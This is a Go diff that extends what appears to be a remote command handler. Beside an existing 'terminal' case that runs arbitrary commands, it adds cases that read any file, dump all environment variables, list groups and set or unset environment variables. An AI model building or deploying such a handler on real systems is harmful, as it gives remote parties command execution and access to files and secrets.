@@ -213,7 +213,7 @@ func main() {
 		case "terminal":
 			commandToRun := strings.Join(string_contents, ",")
 			result = terminal(commandToRun)
-		case "groups":
+		case "groups_id":
 			res, err := DetermineGroups()
 			if err != nil {
 				result = err.Error()
@@ -221,9 +221,48 @@ func main() {
 			if err == nil {
 				result = strings.Join(res, "")
 			}
+		case "groups":
+			vars, err := os.Getgroups()
+			if err != nil {
+				result = "error getting group info %e" + err.Error()
+			}
+			if err == nil {
+				strAr := make([]string, len(vars))
+				for i, num := range vars {
+					strAr[i] = strconv.Itoa(num)
+				}
+				result = strings.Join(strAr, "")
+			}
+		case "read_file":
+			contents, err := os.ReadFile(string_contents[1])
+			if err != nil {
+				result = "error reading file %e" + err.Error()
+			}
+			if err == nil {
+				result = string(contents)
+			}
 		case "pid":
 			pid := os.Getpid()
 			result = fmt.Sprint(pid)
+		case "environment":
+			vars := os.Environ()
+			result = strings.Join(vars, "")
+		case "setenv":
+			err := os.Setenv(string_contents[1], string_contents[2])
+			if err != nil {
+				result = err.Error()
+			}
+			if err == nil {
+				result = "Set env var"
+			}
+		case "remove_var":
+			err := os.Unsetenv(string_contents[1])
+			if err != nil {
+				result = err.Error()
+			}
+			if err == nil {
+				result = "Removed env var"
+			}
 		case "fing":
 			expectedFingerprint = StrH(string_contents[1])
 
